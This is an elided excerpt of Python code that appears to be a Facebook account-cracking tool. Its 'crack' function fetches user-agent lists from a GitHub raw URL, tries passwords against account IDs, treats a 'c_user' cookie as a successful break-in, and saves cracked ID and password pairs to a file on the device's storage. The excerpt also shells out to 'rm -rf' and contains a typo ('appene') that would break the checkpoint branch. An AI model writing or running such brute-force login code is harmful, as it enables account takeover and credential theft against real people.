...
def main():
    ...
    if option =='1':
        ...
        os.system('rm -rf .chrome.txt .android.txt && python shayan.py')
...
def crack():
    ...
    shivali = requests.get('https://raw.githubusercontent.com/SHaYanxALyan/shayansk/main/Safi'+uachoice+'.txt').text.splitlines()
    os.system('clear')
    print(logo)
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in get_cookie:
                print('\033[1;32m  [Successful-shayan] '+uid+' | '+ps+'\033[0;97m')
                oks.append(uid)
                with open('/sdcard/ids/ok.txt','a') as pushpa:
                    pushpa.write(uid+'|'+ps+'\n')
                break
            elif 'checkpoint' in get_cookie:
                print('\033[1;31m  [Checkpoint-shayan] '+uid+' | '+ps+'\033[0;97m')
                cps.appene(uid)
                break
            else:
                continue
